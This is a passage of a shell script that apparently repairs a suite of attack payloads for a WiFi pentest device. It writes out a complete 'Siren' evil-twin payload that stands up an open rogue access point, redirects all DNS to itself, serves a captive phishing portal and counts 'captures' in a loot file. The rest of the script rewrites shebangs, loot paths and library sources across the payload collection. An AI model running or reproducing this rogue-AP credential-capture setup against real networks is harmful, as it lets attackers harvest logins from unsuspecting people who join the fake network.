LOG "Deploying Siren..."

killall hostapd dnsmasq php 2>/dev/null
AP_IF="wlan1"
airmon-ng stop wlan1mon 2>/dev/null
sleep 1

cat > /tmp/siren_hostapd.conf << EOF
interface=$AP_IF
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
auth_algs=1
wpa=0
EOF

hostapd /tmp/siren_hostapd.conf -B 2>/dev/null
sleep 2
ifconfig $AP_IF 192.168.4.1 netmask 255.255.255.0 up

cat > /tmp/siren_dnsmasq.conf << EOF
interface=$AP_IF
bind-interfaces
dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h
address=/#/192.168.4.1
EOF
dnsmasq -C /tmp/siren_dnsmasq.conf 2>/dev/null

cd "$PORTAL_DIR"
php -S 192.168.4.1:80 2>/dev/null &

LOG "Siren active: $SSID ($PORTAL_TYPE)"

sleep "$DURATION_SEC"

killall hostapd dnsmasq php 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/siren_*.conf
airmon-ng start wlan1 2>/dev/null

CAPTURES=$(grep -c "IP:" "$LOOT_FILE" 2>/dev/null || echo 0)

PROMPT "SIREN SILENCED

SSID: $SSID
Portal: $PORTAL_TYPE
Duration: ${DURATION} min
Captures: $CAPTURES
Log: $LOOT_FILE

Press OK to exit."
PAYLOAD_EOF
FIXED=$((FIXED + 1))

##############################################################################
# Remove AutoPwnTest duplicate
##############################################################################
if [ -d "$SUITE_DIR/AutoPwnTest" ] && [ -d "$SUITE_DIR/AutoPwn_Test" ]; then
    rm -rf "$SUITE_DIR/AutoPwnTest"
    echo "[*] Removed duplicate AutoPwnTest (keeping AutoPwn_Test)"
    FIXED=$((FIXED + 1))
fi

##############################################################################
# Fix shebangs on ALL remaining payloads (#!/bin/sh -> #!/bin/bash)
##############################################################################
echo "[*] Fixing shebangs on all remaining payloads..."
for payload in "$SUITE_DIR"/*/payload.sh; do
    [ -f "$payload" ] || continue
    if head -1 "$payload" | grep -q "#!/bin/sh"; then
        sed -i '1s|#!/bin/sh|#!/bin/bash|' "$payload"
        echo "  Fixed shebang: $(dirname "$payload" | xargs basename)"
    fi
done

# Fix all payloads using /root/loot/ to use /mmc/nullsec/
echo "[*] Fixing loot paths..."
for payload in "$SUITE_DIR"/*/payload.sh; do
    [ -f "$payload" ] || continue
    if grep -q '/root/loot/' "$payload"; then
        sed -i 's|/root/loot/|/mmc/nullsec/|g' "$payload"
        echo "  Fixed loot path: $(dirname "$payload" | xargs basename)"
    fi
done

# Fix all payloads sourcing non-existent library
echo "[*] Fixing library source paths..."
for payload in "$SUITE_DIR"/*/payload.sh; do
    [ -f "$payload" ] || continue
    if grep -q 'source /root/payloads/library/nullsec-lib.sh' "$payload"; then
        sed -i 's|source /root/payloads/library/nullsec-lib.sh 2>/dev/null || true||' "$payload"
        echo "  Fixed lib path: $(dirname "$payload" | xargs basename)"
    fi
done

# Make all payloads executable
chmod +x "$SUITE_DIR"/*/payload.sh

echo ""
echo "═══════════════════════════════════════════════"
echo "  PAYLOAD FIX COMPLETE"
echo "  Fixed/Rewritten: $FIXED payloads"
echo "  All shebangs set to #!/bin/bash"
echo "  All loot paths set to /mmc/nullsec/"
echo "═══════════════════════════════════════════════"
